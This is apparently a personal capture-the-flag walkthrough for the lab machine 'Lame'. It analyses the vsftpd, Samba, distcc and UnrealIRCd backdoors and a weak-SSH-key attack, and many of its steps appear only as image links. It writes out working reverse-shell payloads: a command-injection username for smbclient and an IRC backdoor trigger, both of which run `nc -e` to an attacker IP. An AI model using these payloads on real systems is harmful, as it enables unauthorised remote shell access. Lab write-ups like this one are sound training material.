Vuln found but exploit does not successfully produce a shell

![[Pasted image 20240603092646.png]]
***
Let's take a look at the Metasploit exploit code:

![[Pasted image 20240621094022.png]]

![[Pasted image 20240621094204.png]]
![[Pasted image 20240621094239.png]]

Its appears that the first conditional checks see if any alphanumeric number followed by `:)` is entered.

If so, the backdoor is triggered and `id` is run on the victim machine

![[Pasted image 20240621094807.png]]

This ultimately does not work due to UFW settings (compensating control)

See [[1. LAME#**MANUAL Foothold**]] to gain a shell and return here:

After gaining shell, check for services running

![[Pasted image 20240621095948.png]]
We do not see `Port 6200`

Lets check for more users
`/etc/passwd`
![[Pasted image 20240621100130.png]]

![[Pasted image 20240621100430.png]]

Lets rerun and get `makis` to connect locally

`cat /var/log/messages`
You should find UFW Block messages and confirm payload failure from before. Still vulnerable however.

### **MANUAL Foothold**
Avoid Using Metasploit as much as possible


![[Pasted image 20240620130017.png]]

**TTL**
- General rule of thumb:
- 0-64 Most likely Linux host
- 64-127 Windows host
- 128-255 Network Appliance

Dead-end but we have an exploit to analyze
***
### **SMB Exploit**

- We know that no authentication is needed
- Useful to jump to the exploit functions and analyze code
![[Pasted image 20240620135505.png]]

- So we have username taking in a `nohup` no hang up and a payload that is surrounded by back-ticks
- Then a client negotiation presumably starting an smb connection
- The session then takes in the `username`, random 16 characters, and the SMB Domain


- `nohup`: Stands for 'no hang up'. It's a command that allows a process to run in the background even after the user has logged out. It is often used to keep processes running after disconnection from a remote session.
- Back-ticks `(``)`: In many shell environments, text enclosed in back-ticks is executed as a command. The output of the command replaces the back-ticks and the enclosed command.

Simple example in Linux:
![[Pasted image 20240620140622.png]]
- Here, Linux executes the `pwd` command enclosed in back-ticks and uses its output for the `ls` command

So lets try to find where we can use this payload when connecting to smb:
![[Pasted image 20240620141100.png]]

Lets copy the username payload and supply as argument


```
smbclient --no-pass --user="/=`nohup nc -e /bin/sh 10.10.16.17 5555`" //10.10.10.3/tmp
```

![[Pasted image 20240620141752.png]]
![[Pasted image 20240620141800.png]]

HMM, this payload seems to execute a local nc listener back to ourselves
***
Lets connect using interactive prompt and use the `logon` option

**T1190: Initial Access:Exploit Public Facing Web Application**
#TTP 

`find / -iname [user/root].txt`

![[Pasted image 20240620143041.png]]

OR

```
sudo find / \( -iname "user.txt" -o -iname "root.txt" \) -exec cat {} +
```
![[Pasted image 20240620143843.png]]

OR

```
find / \( -iname "user.txt" -o -iname "root.txt" \) -print -exec sh -c 'for file; do echo "=== $file ==="; cat "$file"; done' sh {} +
```
![[Pasted image 20240620143816.png]]


- `find /`: Start the search from the root directory.
- Group the conditions to apply the -o (or) operator.
- `iname "user.txt"`: Case-insensitive search for user.txt.
- `o`: Logical OR to combine search conditions.
- `iname "root.txt"`: Case-insensitive search for root.txt.
- `-print`: Print the name of each found file.
- `-exec sh -c 'for file; do ...; done' sh {} +`: For each found file, execute the shell script. The sh -c allows for executing a shell command and 
- `sh {}` is used to pass the found files as arguments to the shell script.
- `echo "=== $file ==="`: Print the filename with === around it for clear separation.
- `cat "$file"`: Display the contents of the file.


Alternatively we can simplify with:


```
find / \( -iname "user.txt" -o -iname "root.txt" \) -print -exec cat {} +
```

### **DISTCCD Exploit**

```
![[Pasted image 20240621104555.png]]

![[Pasted image 20240621104750.png]]


Copy script and rename to `disstcc-exec` and and supply payload

![[Pasted image 20240621105741.png]]

`searchsploit -m [exploit]`
![[Pasted image 20240621115208.png]]

Serve using `python` and Retrieve with`wget`
![[Pasted image 20240621115459.png]]

![[Pasted image 20240621115551.png]]

Compile using `gcc`

Run
![[Pasted image 20240621121150.png]]
![[Pasted image 20240621121259.png]]

So this payload is looking for a file named `run`
Create:
![[Pasted image 20240621121757.png]]

⚠️ After some time poking around I decided to move on as I couldnt get this exploit to successfully spawn a shell ⚠️

`ps -auxww | grep irc`
![[Pasted image 20240624203944.png]]
![[Pasted image 20240624204427.png]]

We find IRC running as root


Lets take a look at some exploits using searchsploit

![[Pasted image 20240624204145.png]]

`searchsploit -x 16922`
![[Pasted image 20240624204530.png]]

- Very similar to VSFTD backdoor where we can append `AB;` to trigger a backdoor and include a payload

- Lame is listening locally for UnrealIRCD on 6667
- Lets pipe a payload to an `nc` listener that attempts a connection to Unrealircd on local host

`echo "AB; nc -e /bin/bash 10.10.16.17 9001" | nc 127.0.0.1 6697`

We may be able to predict PRNG due to readable `authorozed_keys` file

Pull github code:
![[Pasted image 20240624211244.png]]

Extract using `tar`
![[Pasted image 20240624211550.png]]


`T1110.002: Credential Access:Password Cracking`
#TTP 

The `rsa` folder contains cracked public and private keys
![[Pasted image 20240624211814.png]]

So we need to get the public key for `authorized_keys`
![[Pasted image 20240624212128.png]]

Copy and search in `/rsa` folder for match

`grep -lr [ssh-rsa-keys]`
![[Pasted image 20240624212410.png]]
- We find the file that contains the public key
- So the value without the .pub extension is the private key
- Use that to log in
